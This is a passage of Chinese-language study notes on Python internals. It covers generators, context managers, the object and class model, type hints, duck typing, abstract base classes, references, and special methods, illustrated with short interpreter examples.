&gt;&gt;&gt; a,*b = [1,2,3]
&gt;&gt;&gt; a,b
(1, [2, 3])

&gt;&gt;&gt; 1 in b
False
&gt;&gt;&gt; 2 in b
True

&gt;&gt;&gt; b_copy = b[:]
&gt;&gt;&gt; id(b_copy)
139903358657344
&gt;&gt;&gt; id(b)
139903349323392
</code></pre>
<h2 id="生成器函数"><a class="header" href="#生成器函数">生成器函数</a></h2>
<blockquote>
<p><strong>一个使用了yield表达式的def语句是一个生成器函数。<strong>当被调用时，它返回一个</strong>新的生成器对象</strong>，该对象会自动保存局部作用域和代码执行位置，一个自动创建的<code>__iter__</code>方法能返回自身，一个自动创建的<code>__next__</code>方法可以启动函数或从上次退出的地方继续执行，并在结果产生结束时引发一个<code>StopIteration</code>异常。</p>
</blockquote>
<p>这是一个无限产生斐波那契数列的例子</p>
<pre><code class="language-python">&gt;&gt;&gt; def fib():
...     a,b = 1,0
...     while True:
...             a,b,c = a+b,a,b
...             yield b
... 
&gt;&gt;&gt; gen = fib()
&gt;&gt;&gt; gen
&lt;generator object fib at 0x7f0636038ba0&gt;
&gt;&gt;&gt; gen.__next__()
1
&gt;&gt;&gt; gen.__next__()
1
&gt;&gt;&gt; gen.__next__()
2
</code></pre>
<p><code>fib</code>函数返回一个生成器对象，通过<code>__next__()</code>方法使用生成器，当然一般情况都是用<code>for</code>循环或者别的函数式工具像迭代器一样使用的（就是迭代器），一般不会真的去直接调用<code>__next__</code>。</p>
<ul>
<li>第一次使用，从函数开始的地方，一直到<code>yield b</code>将值返回。</li>
<li>之后使用，从上次<code>yield</code>的地方开始，一直到<code>yield b</code>将值返回。</li>
<li>一直执行到<code>return b</code>（在上面的例子不会执行到return）。抛出一个异常<code>StopIteration: b</code>。如果你没有写<code>return</code>，Python默认<code>return None</code>。</li>
</ul>
<h2 id="生成器表达式"><a class="header" href="#生成器表达式">生成器表达式</a></h2>
<blockquote>
<p>一个包括在圆括号中的列表推导表达式被称为一个生成器表达式。当他运行时，会返回一个新的生成器对象，这个对象带有一个同样是被自动创建的方法接口和状态保持，和生成器函数类似的<code>__iter__</code>方法和<code>__next__</code>方法。</p>
</blockquote>
<p>他确实和<code>map</code>+<code>filter</code>很像。</p>
<div class="table-wrapper"><table><thead><tr><th>生成器表达式</th><th>对应的函数</th></tr></thead><tbody>
<tr><td><code>(i+1 for i in [1,2,3])</code></td><td><code>map(lambda i:i+1,[1,2,3])</code></td></tr>
<tr><td><code>(i for i in [1,2,3] if i&gt;2)</code></td><td><code>filter(lambda i:i&gt;2,[1,2,3])</code></td></tr>
</tbody></table>
</div>
<p>你可以用生成器表达式来模拟其他的三个推导，这里的双重括号是可以省略的，但是看着更清楚一点。</p>
<div class="table-wrapper"><table><thead><tr><th>生成器表达式</th><th>推导</th></tr></thead><tbody>
<tr><td><code>list((i+1 for i in [1,2,3]))</code></td><td><code>[i+1 for i in [1,2,3]]</code></td></tr>
<tr><td><code>set((i+1 for i in [1,2,3]))</code></td><td><code>{i+1 for i in [1,2,3]}</code></td></tr>
<tr><td><code>dict(((i,i+1) for i in [1,2,3]))</code></td><td><code>{i:i+1 for i in [1,2,3]}</code></td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="上下文管理器"><a class="header" href="#上下文管理器">上下文管理器</a></h1>
<p>上下文管理器是指在一段代码执行之前执行一段代码，用于一些预处理工作；执行之后再执行一段代码，用于一些清理工作。比如打开文件进行读写，读写完之后需要将文件关闭。又比如在数据库操作中，操作之前需要连接数据库，操作之后需要关闭数据库。在上下文管理协议中，有两个方法<code>__enter__</code>和<code>__exit__</code>，分别实现上述两个功能。</p>
<h2 id="with语句"><a class="header" href="#with语句">with语句</a></h2>
<p>with 语句用于包装带有使用<strong>上下文管理器</strong>定义的方法的代码块的执行。 这允许对普通的 try...except...finally 使用模式进行封装以方便地重用。</p>
<pre><code class="language-python">with EXPRESSION as TARGET:
    SUITE
</code></pre>
<p>在语义上等价于:</p>
<pre><code class="language-python">manager = (EXPRESSION)
enter = type(manager).__enter__
exit = type(manager).__exit__
value = enter(manager)
hit_except = False

try:
    TARGET = value
    SUITE
except:
    hit_except = True
    if not exit(manager, *sys.exc_info()):
        raise
finally:
    if not hit_except:
        exit(manager,None,None,None)
</code></pre>
<p><code>sys.exc_info()</code>返回的元组包含三个值，它们给出当前正在处理的异常的信息<code>(type, value, traceback)</code>。它们的含义是：<code>type</code>是正在处理的异常类型（它是 BaseException 的子类）；<code>value</code> 是异常实例（异常类型的实例）；<code>traceback</code> 是一个 回溯对象，该对象封装了最初发生异常时的调用堆栈。</p>
<hr />
<p>https://zhuanlan.zhihu.com/p/24709718</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="工作原理"><a class="header" href="#工作原理">工作原理</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="oop模型"><a class="header" href="#oop模型">OOP模型</a></h1>
<p>Python的OOP模型中有两个对象：</p>
<ul>
<li>类对象：提供默认行为，是实例对象的工厂。类对象来自语句。
<ul>
<li><code>class</code>语句创建类对象，并将其赋值给一个名称。</li>
<li><code>class</code>语句内的赋值语句，会产生<strong>类对象的属性</strong>。类的属性可以通过<code>object.name</code>的方式访问。</li>
<li>类内部的函数<code>def</code>语句产生<strong>方法</strong>。</li>
</ul>
</li>
<li>实例对象：是程序处理的实际对象。实例对象来自调用。
<ul>
<li>像函数一样调用类对象会创建新的实例对象。</li>
<li>每个实例<strong>继承了类的属性</strong>，并获得了自己的命名空间，在一开始是空的。</li>
<li>在类的方法对self的属性做赋值运算会产生每个实例自己的属性。</li>
</ul>
</li>
</ul>
<p>注意，实例(instance)和对象(object)，都指的是类的具体化。所以，一切皆对象，也就是一切皆实例，也就是说类也是实例。</p>
<h2 id="一切皆对象"><a class="header" href="#一切皆对象">一切皆对象</a></h2>
<ol>
<li><strong>All classes in Python are objects of the <code>type</code> class</strong>, and this <code>type</code> class is called <code>Metaclass</code>.</li>
<li><strong>Each class in Python, by default, inherits from the <code>object</code> base class.</strong></li>
</ol>
<p>也就是说，Python中的<strong>一切都是对象</strong>，包括<strong>类也是对象</strong>。这个和其他OOP语言可能是大相径庭的。</p>
<p>Python当中<strong>继承和实例</strong>是很相似的。“a 是 A 的实例”和“AA 是 A 的子类”，都会把A的方法加到自己的方法搜索树中。不过a继承了b, b继承了c，我们可以说a继承了c。a是b的实例，b是c的实例，但是a不是c的实例。</p>
<ul>
<li><strong>当我们写下<code>class A(object)</code>的时候，我们实际上创建了一个实例<code>A</code>，是<code>type</code>的实例</strong>。</li>
<li>当我们写下<code>def a()</code>的时候，实际上创建了一个实例<code>a</code>，是<code>function</code>的实例。</li>
<li>当我们写下<code>import mod</code>的时候，实际上创建了一个实例<code>mod</code>，是<code>module</code>的实例。</li>
<li>至于其他的就更不必说了，比如<code>&quot;hello&quot;</code>是<code>str</code>的实例，<code>1</code>是<code>int</code>的实例，等等。所以Python中一切都是对象，掌握对对象的操作就掌握了对Python中所有东西的操作。</li>
</ul>
<p>所以我们对对象可以有哪些操作呢？也就是各种各样的<a href="https://docs.python.org/zh-cn/3.10/reference/expressions.html#">表达式</a>了。通过<a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__init#data-model">重载一些特殊的方法</a>，我们可以实现对对象的定制。</p>
<p>借用一张图。</p>
<p><img src="Language/Python/1%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/../images/combined.png" alt="Inheritance and metaclass in Python" /></p>
<p>一个Object的attributes，可以来源于</p>
<ol>
<li>自定义的属性存在<code>__dict__</code>，通过<code>a.xxx = xxx</code>就可以定义属性。</li>
<li>他的<strong>所属的类</strong><code>__class__</code>的属性。</li>
<li>他所属的类的<strong>父类</strong>们<code>__class__.__bases__</code>的属性，从爸爸找到爷爷一直网上找，如果爸爸有好几个会有一个确定的爸爸中的查找顺序。</li>
</ol>
<p>所以<code>human_obj</code>就不会有<code>type</code>的方法了，没有<code>__class__.__class__</code>这样的查找路线。当然，在Python中你也可以自定义attribute的搜索。</p>
<hr />
<p>另外，既然函数也是对象，所以对函数的调用又是什么呢？看一个例子</p>
<pre><code class="language-python">class A():
    def mthd(self):
        pass

    @staticmethod
    def static_mthd():
        pass

    @classmethod
    def class_mthd(cls):
        pass

def func():
    pass

print(func.__class__) # &lt;class 'function'&gt;
print(a.static_mthd.__class__) # &lt;class 'function'&gt;
print(a.mthd.__class__) # &lt;class 'method'&gt;
print(a.class_mthd.__class__) # &lt;class 'method'&gt;
# 调用四个函数/方法和下面的写法是等价的
function.__call__(func)
function.__call__(a.static_mthd)
method.__call__(a.mthd)
method.__call__(a.class_mthd)
</code></pre>
<p>对于<strong>一般</strong>的函数，是<code>function</code>的实例，对于<strong>一般</strong>的方法，是<code>method</code>的实例。（内置函数比较特殊，不管）。</p>
<p><code>function</code>不会为函数传入默认的self/cls当做第一个参数，而<code>method</code>会为方法传入默认的self/cls当做第一个参数。至于他们具体的<code>__call__</code>方法是如何实现的，使用C语言实现的（对于CPython），我们就不必深究了。我们在自定义自己的<code>__call__</code>的时候，只需要借用他们的<code>function</code>和<code>method</code>的<code>__call__</code>就好了。</p>
<h2 id="类模型"><a class="header" href="#类模型">类模型</a></h2>
<p>Python的类是一棵树，实例是类的儿子，子类也是父类的儿子。从这一点看的话类和实例是一样的。</p>
<pre><code class="language-python">&gt;&gt;&gt; class A():
...     a = []
... 
&gt;&gt;&gt; t = A()
&gt;&gt;&gt; t.a.append(1)
&gt;&gt;&gt; t.a
[1]
&gt;&gt;&gt; A.a
[1]
&gt;&gt;&gt; t.a = [2]
&gt;&gt;&gt; A.a
[1]
</code></pre>
<p>在上面的语句中，类树是这么演化的。继承也是一样的道理。</p>
<ol>
<li>创建了类<code>A</code></li>
<li>创建了类<code>A</code>的实例<code>t</code></li>
<li>对<code>t.a</code>进行修改，由于<code>t</code>的命名空间不存在属性<code>a</code>，向上查找，在A中找到，修改<code>A.a</code></li>
<li>对<code>t.a</code>进行赋值，对类的赋值操作会产生新的属性，所以<code>t</code>有了属性<code>a</code></li>
</ol>
<p><img src="Language/Python/1%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/../images/object_python.drawio.svg" alt="树" /></p>
<blockquote>
<p><code>object.attribute</code>可以等同于：找出attribute首次出现的地方，先搜索object，然后是该对象之上的所有类，由下往上，从左到右。</p>
</blockquote>
<hr />
<p><a href="https://www.honeybadger.io/blog/python-instantiation-metaclass/">很好的介绍了类的前世今生</a></p>
<p><a href="https://www.demo2s.com/python/python-attribute-lookup.html">attribute lookup</a></p>
<p><a href="https://eli.thegreenplace.net/2012/03/23/python-internals-how-callables-work/">callable到底是如何工作的</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="类型-1"><a class="header" href="#类型-1">类型</a></h1>
<p>我们在之前的学习中可能都了解到，Python是<strong>动态强类型</strong>语言。</p>
<p>动态类型是<strong>类型系统</strong>其中一类，即程序在运行期间可以修改变量类型。 静态类型，在编译期就决定了变量类型，运行期不允许发生变化。 类型系统还有一种分法是强类型和弱类型，强类型是指禁止类型不匹配的指令，你需要自己做强制类型转换，弱类型反之。</p>
<p>静态类型在三个方面具备优势：<strong>性能、错误发现、高效重构</strong>。Python虽然不会变成静态类型的语言，但是也会需要吸收静态类型的思想（就像 TypeScript）。</p>
<h2 id="动态强类型"><a class="header" href="#动态强类型">动态强类型</a></h2>
<p>之前熟悉的语言都是静态类型的，比如C/C++和Rust。举个能体现动态强类型的例子。</p>
<pre><code class="language-python"># 强类型，不匹配的类型不会帮你隐式转换。
# 动态类型，只有执行的时候才会去做类型检查。
&gt;&gt;&gt; def plus(a):
...     print(a+1)
... 
&gt;&gt;&gt; plus(1)
2
&gt;&gt;&gt; plus(&quot;1&quot;)
Traceback (most recent call last):
  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
TypeError: can only concatenate str (not &quot;int&quot;) to str
</code></pre>
<p>这里的plus函数，其实对a是有要求的（需要是“数字”，但是这里的底层肯定是C，应该没有Python的源代码可以看）。</p>
<h2 id="typing-类型提示支持"><a class="header" href="#typing-类型提示支持"><a href="https://docs.python.org/zh-cn/3/library/typing.html#module-typing"><code>typing</code></a> 类型提示支持</a></h2>
<p>比如上面的代码可以写成下面这样。然而，其实<strong>执行效果和上面是一模一样</strong>的。type hint只是方便你人工阅读、IDE检查、第三方检查工具的工作，<strong>不会对实际的运行产生任何效果，比如1.4并不是int，但是运行并没有问题</strong>。</p>
<p>看下面的类型注解，<strong>我差点以为我在写Rust</strong>。</p>
<pre><code class="language-python">&gt;&gt;&gt; def plus(a:int) -&gt; None:
...     print(a+1)
... 
&gt;&gt;&gt; plus(1.4)
2.4
</code></pre>
<p>所以，这个type hint可以是什么呢？虽然他不对实际运行产生效果，但是你乱写还是会报错的。</p>
<ul>
<li>
<p><code>type</code>: 比如<code>int</code> <code>str</code>，你几乎可以把它当做<code>class</code>的名字，当然也包括你自定义的<code>class</code>。</p>
</li>
<li>
<p><a href="https://docs.python.org/zh-cn/3/library/typing.html#typing.Any"><code>Any</code></a> : <a href="https://docs.python.org/zh-cn/3/library/typing.html#typing.Any"><code>Any</code></a> 是一种特殊的类型。静态类型检查器认为所有类型均与 <a href="https://docs.python.org/zh-cn/3/library/typing.html#typing.Any"><code>Any</code></a> 兼容，同样，<a href="https://docs.python.org/zh-cn/3/library/typing.html#typing.Any"><code>Any</code></a> 也与所有类型兼容。</p>
</li>
<li>
<p><a href="https://docs.python.org/zh-cn/3/library/typing.html#typing.Union"><code>Union[type1, type2, ...]</code></a>:  表示<code>type1</code>或<code>type2</code>或....</p>
</li>
<li>
<p>[<code>Optional[type]</code>](https://docs.python.org/zh-cn/3/library/typing.html#typin g.Optional): 表示<code>type</code>或<code>None</code></p>
</li>
<li>
<p><code>Literal['r', 'rb', 'w', 'wb']</code>: 表示参数只能是这几个字面量中的一个。</p>
</li>
<li>
<p><code>Callable[[Arg1Type, Arg2Type], ReturnType]</code>: 表示一个函数</p>
</li>
<li>
<p><a href="https://docs.python.org/zh-cn/3/library/typing.html#typing.NoReturn"><code>NoReturn</code></a>: 顾名思义，表示没有返回值。你也可以不用写，不过写了看着更清楚一点。在Python里函数默认返回的是None，没有返回值的意思是根本就不会返回。</p>
</li>
<li>
<p><code>Generic</code>: 泛型，这个稍微复杂一点，给个例子。首先用<code>TypeVar</code>定义一个类型，然后在后面的类型声明周就可以使用了。通常情况是和容器一起使用的，比如<code>Sequence</code>,<code>Iterable</code>,<code>Iterator</code>,<code>Mapping</code>等，详见<a href="https://docs.python.org/zh-cn/3.8/library/collections.abc.html#collections.abc.Container">标准库</a>。</p>
<pre><code class="language-python">from typing import TypeVar,Sequence

T = TypeVar('T')      # Declare type variable
def first(l: Sequence[T]) -&gt; T:   # Generic function
    return l[0]

li = [1,2,3]
print(first(li))
</code></pre>
</li>
</ul>
<blockquote>
<p>Type VS Class</p>
<p>In Python, classes are object factories defined by the <code>class</code> statement, and returned by the <code>type(obj)</code> built-in function. Class is a dynamic, runtime concept.</p>
<p>Type concept is described above, types appear in variable and function type annotations, can be constructed from building blocks described below, and are used by static type checkers.</p>
</blockquote>
<blockquote>
<p>其实类型信息存放在<code>__annotations__</code>字段中，所以也不能说完全和运行时无关把，不然怎么乱写会报错呢。</p>
<pre><code class="language-python">&gt;&gt;&gt; plus.__annotations__
{'a': &lt;class 'int'&gt;}
</code></pre>
</blockquote>
<p>VS code可以用<em>Pylance</em>插件，在<code>Type Checking Mode</code>选择<code>basic</code>或者<code>strict</code>打开类型检查。添加类型注解让<em>Pylance</em>检查你的参数，还可以提供自动补全（没有自动补全不会写代码的我狂喜）。像<code>plus(1.4)</code>的例子，就会被检查出类型不匹配。</p>
<h2 id="鸭子类型"><a class="header" href="#鸭子类型">鸭子类型</a></h2>
<p>差点忘了介绍Python中最重要的鸭子类型。</p>
<blockquote>
<p>鸭子类型指一种编程风格，它并不依靠查找对象类型来确定其是否具有正确的接口，而是直接调用或使用其方法或属性（“看起来像鸭子，叫起来也像鸭子，那么肯定就是鸭子。”）由于强调接口而非特定类型，设计良好的代码可通过允许多态替代来提升灵活性。鸭子类型避免使用 <a href="https://docs.python.org/zh-cn/3.8/library/functions.html#type"><code>type()</code></a> 或 <a href="https://docs.python.org/zh-cn/3.8/library/functions.html#isinstance"><code>isinstance()</code></a> 检测。(但要注意鸭子类型可以使用 <a href="https://docs.python.org/zh-cn/3.8/glossary.html#term-abstract-base-class">抽象基类</a> 作为补充。) 而往往会采用 <a href="https://docs.python.org/zh-cn/3.8/library/functions.html#hasattr"><code>hasattr()</code></a> 检测或是 <a href="https://docs.python.org/zh-cn/3.8/glossary.html#term-eafp">EAFP</a> 编程。</p>
</blockquote>
<p>举一个例子。这里定义了一个非常简单的类<code>A</code>，有一个<code>hello</code>方法，我们在调用的时候可以写成<code>a.hello</code>，也可以写成<code>A.hello(a)</code>，他们是一个意思。</p>
<pre><code class="language-python">class A():
    a = 114514

    def hello(self):
        print(self.a)

a = A()
a.hello()
A.hello(a)
</code></pre>
<p>假如你对鸭子类型并不熟悉，你可能会觉得<code>A.hello()</code>的参数肯定需要是<code>A</code>类型的，这非常符合直觉。Python是强类型的。如果你写出下面的代码</p>
<pre><code class="language-python">class B:
    pass

b = B()
# b.a = 1
A.hello(b)
</code></pre>
<p>那Python肯定不乐意嘛。确实如此，他报错了<code>AttributeError: 'B' object has no attribute 'a'</code>。不过注意哦，这里报的错是<code>B</code>没有属性<code>a</code>，而不是说<code>b</code>不是类型<code>A</code>。如果我们把注释去掉，就可以正常执行了。</p>
<blockquote>
<p>虽然可以正常执行，但是这里只是为了举个例子。这样的代码除了让人迷惑没有别的好处。</p>
</blockquote>
<p>这就是鸭子类型。Python<strong>并不在意说你传的参数到底是什么类型，只要你有对应的方法/字段就可以</strong>。他并不在意你是否是类型<code>A</code>，只是在意你是否有属性<code>a</code>。这给Python带来了非常高度的灵活性，也是Python为什么不强制添加类型标注的原因。</p>
<p>当然，太自由也并不是一件好事，比如上面的代码你的IDE肯定非常不满意，要给你报错。如果你在你的工程大量使用这种动态的特性，静态检查肯定会给你报一堆错误，而且自动补全也会失灵，虽然运行时可能并没有问题。虽然Python本质是动态类型的，但是新版本的Python引入了很多复杂的类型标注来迎合静态检查，个人也比较喜欢更静态的风格。</p>
<p>如果，我们能做到，在<code>A.hello</code>中，声明“传入的参数必须要有属性a”就好了。是不是感觉这个有点眼熟，这不就是其他语言中的接口的感觉吗。</p>
<h2 id="抽象基类"><a class="header" href="#抽象基类">抽象基类</a></h2>
<blockquote>
<p>抽象基类abstract base type，简称 ABC，是对 <a href="https://docs.python.org/zh-cn/3.8/glossary.html#term-duck-typing">duck-typing</a> 的补充，它提供了一种定义接口的新方式，相比之下其他技巧例如 <a href="https://docs.python.org/zh-cn/3.8/library/functions.html#hasattr"><code>hasattr()</code></a> 显得过于笨拙或有微妙错误（例如使用 <a href="https://docs.python.org/zh-cn/3.8/reference/datamodel.html#special-lookup">魔术方法</a>）。ABC 引入了虚拟子类，这种类并非继承自其他类，但却仍能被 <a href="https://docs.python.org/zh-cn/3.8/library/functions.html#isinstance"><code>isinstance()</code></a> 和 <a href="https://docs.python.org/zh-cn/3.8/library/functions.html#issubclass"><code>issubclass()</code></a> 所认可；详见 <a href="https://docs.python.org/zh-cn/3.8/library/abc.html#module-abc"><code>abc</code></a> 模块文档。Python 自带许多内置的 ABC 用于实现数据结构（在 <a href="https://docs.python.org/zh-cn/3.8/library/collections.abc.html#module-collections.abc"><code>collections.abc</code></a> 模块中）、数字（在 <a href="https://docs.python.org/zh-cn/3.8/library/numbers.html#module-numbers"><code>numbers</code></a> 模块中）、流（在 <a href="https://docs.python.org/zh-cn/3.8/library/io.html#module-io"><code>io</code></a> 模块中）、导入查找器和加载器（在 <a href="https://docs.python.org/zh-cn/3.8/library/importlib.html#module-importlib.abc"><code>importlib.abc</code></a> 模块中）。你可以使用 <a href="https://docs.python.org/zh-cn/3.8/library/abc.html#module-abc"><code>abc</code></a> 模块来创建自己的 ABC。</p>
</blockquote>
<p>上面是官方文档的介绍，看了你可能有点晕了。不过，实际上你可将抽象基类和Java中的Interface，Rust/Scala中的Trait进行类比。因为从功能上来说：</p>
<ol>
<li>抽象基类不能实例化</li>
<li>子类需要实现基类指定的抽象方法</li>
</ol>
<p>先看第一种写法，这种写法其实更类似于Java/Scala中的abstract class而不是Interface/Trait。通过继承，将抽象基类中的抽象方法全部实现。</p>
<pre><code class="language-python">from abc import ABC, abstractmethod

class Animal(ABC):
    @abstractmethod
    def hello(self):
        &quot;&quot;&quot;say hello&quot;&quot;&quot;

    def hello_twice(self):
        self.hello()
        self.hello()


class Cat(Animal):
    def hello(self):
        print(&quot;喵&quot;)


class Cow(Animal):
    def hello(self):
        print(&quot;哞&quot;)


cow = Cow()
cow.hello_twice()
</code></pre>
<p>比较像接口的是这样的，通过<code>register</code>方法将我们的类型注册为抽象基类的子类。<strong>这样做我们不需要让我们的类型实现抽象基类的所有抽象方法</strong>（当然，这种欺骗编译器的做法，在真正调用到未定义的方法的时候还是会报错的）。</p>
<pre><code class="language-python">class Tree:
    pass


tree = Tree()
Animal.register(Tree)
assert issubclass(Tree, Animal)
assert isinstance(tree, Animal)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="变量"><a class="header" href="#变量">变量</a></h1>
<h2 id="命名惯例"><a class="header" href="#命名惯例">命名惯例</a></h2>
<ul>
<li><code>_x</code> 以单一下划线开头的变量不会被<code>from module import *</code>导入</li>
<li><code>__x__</code> 前后双下划线的变量是系统定义的名称，对解释器有特殊意义，你不要把变量命名成这样。</li>
<li><code>__x</code> 前双下划线的变量是<strong>外围变量的本地变量</strong></li>
<li>在交互式命令行，<code>_</code>变量保存最后一个表达式的结果</li>
</ul>
<h2 id="底层"><a class="header" href="#底层">底层</a></h2>
<pre><code class="language-python">&gt;&gt;&gt; a = 3
</code></pre>
<ol>
<li>创建一个对象来表示值“3”</li>
<li>创建一个变量a，如果他还没有被创建的话</li>
<li>将“3”和a关联在一起</li>
</ol>
<p>在Python中，从变量到对象的连接称为<strong>引用</strong>。这样看的话，引用和C语言中的指针很像，事实也如此。但是有两点需要注意：我们不能对这个“指针”本身做任何事情，他是永远会自动解引用的。</p>
<p><code>id</code>方法返回一个object唯一的identifier，在CPython的实现中，就是object的地址。</p>
<pre><code class="language-python">&gt;&gt;&gt; a = &quot;122&quot;
&gt;&gt;&gt; b = &quot;122&quot;
&gt;&gt;&gt; hex(id(a))
'0x7fcf43af38f0'
&gt;&gt;&gt; hex(id(b))
'0x7fcf43af38f0'
</code></pre>
<p>这里按理来说我应该创建两个不同的对象，为什么他们指向同一块内存？事实上，因为字符串属于<strong>不可变对象</strong>，我们可以将他们优化为指向同一块内存。</p>
<p><img src="Language/Python/1%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/../images/ref.drawio.svg" alt="ref.drawio" /></p>
<p>根据垃圾回收的原理，当a和b都结束生命的时候，对象没有任何引用了，“122”这个对象就可以销毁了。</p>
<p>但是如果是可变对象就不是这样了。</p>
<pre><code class="language-python">&gt;&gt;&gt; a = []
&gt;&gt;&gt; b = []
&gt;&gt;&gt; c = a
&gt;&gt;&gt; hex(id(a))
'0x7fcf43060240'
&gt;&gt;&gt; hex(id(b))
'0x7fcf430addc0'
&gt;&gt;&gt; hex(id(c))
'0x7fcf43060240'
</code></pre>
<p><img src="Language/Python/1%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/../images/ref2.drawio.svg" alt="ref2.drawio" /></p>
<p>a和c指向了同一个对象，意味着你对a的修改会同时修改a,c两个变量。</p>
<p>Python中<strong>对象</strong>的metadata标记了这个对象的<strong>类型</strong>以及<strong>引用计数</strong>。当引用计数为0的时候对象被垃圾回收器回收。对于循环引用的情况，Python也是可以处理的，你可以关闭对循环引用的检测回收功能，如果你确信你的代码不会有循环引用的话。不过在默认情况下这是开启的。关于垃圾处理的更多细节，可以参考<a href="https://docs.python.org/3/library/gc.html?highlight=gc#module-gc"><code>gc</code></a>模块。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="特殊方法和重载"><a class="header" href="#特殊方法和重载">特殊方法和重载</a></h1>
<blockquote>
<p>Python是一个充满钩子的语言</p>
</blockquote>
<h2 id="id和type"><a class="header" href="#id和type">id和type</a></h2>
<p>Object是Python对数据的抽象。你可以说Python中<strong>一切皆对象</strong>。每个对象有一个id，id是唯一区分一个对象的整数。内置方法<code>id()</code>返回一个对象的id。<code>is</code>运算符就是比较两个对象的id是否相等。</p>
<p>在CPython的实现中，<code>id(x)</code>就是对象x的地址。</p>
<p>每个对象也有一个type。内置方法<code>type()</code>返回一个对象的type，他和id一样也是不可变的。<code>type</code>本身也是一个对象。<code>x.__class__</code>也返回x的type。	</p>
<pre><code class="language-python">&gt;&gt;&gt; x = []
&gt;&gt;&gt; type(x)
&lt;class 'list'&gt;
&gt;&gt;&gt; type(type(x))
&lt;class 'type'&gt;
&gt;&gt;&gt; type(type(type(x)))
&lt;class 'type'&gt;
</code></pre>
<h2 id="对象的诞生和终结"><a class="header" href="#对象的诞生和终结">对象的诞生和终结</a></h2>
<p>虽然平时我们经常说可以把<code>__init__</code>理解成构造函数，但是实际上<code>__new__</code>方法创建了一个新的实例，而<code>__init__</code>是对<code>__new__</code>创建的实例做初始化工作。</p>
<pre><code class="language-python">object.__new__(cls[, ...])
object.__init__(self[, ...])
object.__del__(self)
</code></pre>
<p>在大多数情况下我们不需要自己去实现<code>__new__</code>，我们使用默认的<code>__new__</code>然后在<code>__init__</code>中处理初始化逻辑就好了。不过<code>__new__</code>可以让我们使用<strong>单例模式</strong>，或者创建不可变的子类（不可变的子类就是单例）。</p>
<p><code>__del__</code>在实例将被销毁时调用，可以理解成析构函数（不恰当）。不要自己去实现它。<code>del x</code> 并不直接调用 <code>x.__del__()</code> --- 前者会将 <code>x</code> 的引用计数减一，而后者仅会在 <code>x</code> 的引用计数变为零时被调用。</p>
<h2 id="打印"><a class="header" href="#打印">打印</a></h2>
<pre><code class="language-python">object.__repr__(self)
object.__str__(self)
object.__bytes__(self)
</code></pre>
<p><code>__repr__</code>如果可能，这应类似一个有效的 Python 表达式，能被用来重建具有相同取值的对象（只要有适当的环境）。<code>__str__</code>应该生成一个格式良好的字符串。<strong>可以理解成Rust中的<code>Debug</code>和<code>Display</code>。</strong></p>
<p><code>__bytes__</code>通过<code>bytes</code> 调用以生成一个对象的字节串表示。这应该返回一个 <code>bytes</code> 对象。</p>
<h2 id="比较"><a class="header" href="#比较"><a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__lt__">比较</a></a></h2>
<pre><code class="language-python">object.__lt__(self, other)
object.__le__(self, other)
object.__eq__(self, other)
object.__ne__(self, other)
object.__gt__(self, other)
object.__ge__(self, other)
</code></pre>
<p>在默认情况下，<code>object</code> 通过使用 <code>is</code> 来实现 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__eq__"><code>__eq__()</code></a>。</p>
<p>Python中<strong>比较运算符之间没有其他隐含关系或默认实现</strong>。例如，<code>(x&lt;y or x==y)</code> 为真并不意味着 <code>x&lt;=y</code>。 要根据单根运算自动生成排序操作，请参看 <a href="https://docs.python.org/zh-cn/3/library/functools.html#functools.total_ordering"><code>functools.total_ordering()</code></a>。</p>
<h2 id="hash-1"><a class="header" href="#hash-1"><a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__hash__">Hash</a></a></h2>
<p>通过内置函数 <a href="https://docs.python.org/zh-cn/3/library/functions.html#hash"><code>hash()</code></a> 调用以对哈希集的成员进行操作，属于哈希集的类型包括 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#set"><code>set</code></a>、<a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#frozenset"><code>frozenset</code></a> 以及 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#dict"><code>dict</code></a>。<a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__hash__"><code>__hash__()</code></a> 应该<strong>返回一个整数</strong>。对象比较结果相同所需的唯一特征属性是其具有相同的哈希值；建议的做法是把参与比较的对象全部组件的哈希值混在一起，即将它们打包为一个元组并对该元组做哈希运算。</p>
<p>用户定义的类默认带有 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__eq__"><code>__eq__()</code></a> 和 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#object.__hash__"><code>__hash__()</code></a> 方法，如果你为你的类单独实现了<code>__eq__</code>，也应该为他单独实现<code>__hash__</code>，或者不实现。</p>
<h2 id="自定义属性访问"><a class="header" href="#自定义属性访问"><a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#customizing-attribute-access">自定义属性访问</a></a></h2>
<pre><code class="language-python">object.__getattr__(self, name)
object.__getattribute__(self, name)
object.__setattr__(self, name, value)
object.__delattr__(self, name)
object.__dir__(self)

object.__get__(self, instance, owner=None)
object.__set__(self, instance, value)
object.__delete__(self, instance)
</code></pre>
<p><code>__seetattr__</code>方法在一个属性被尝试赋值时被调用。这个调用会取代正常机制（即将值保存到实例字典）。 <em>name</em> 为属性名称， <em>value</em> 为要赋给属性的值。</p>
<p><code>__dir__</code>方法会在对相应对象调用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#dir"><code>dir()</code></a> 时被调用。返回值必须为一个序列。</p>
<h2 id="真值和长度"><a class="header" href="#真值和长度">真值和长度</a></h2>
<pre><code class="language-python">object.__bool__(self)
object.__len__(self)
</code></pre>
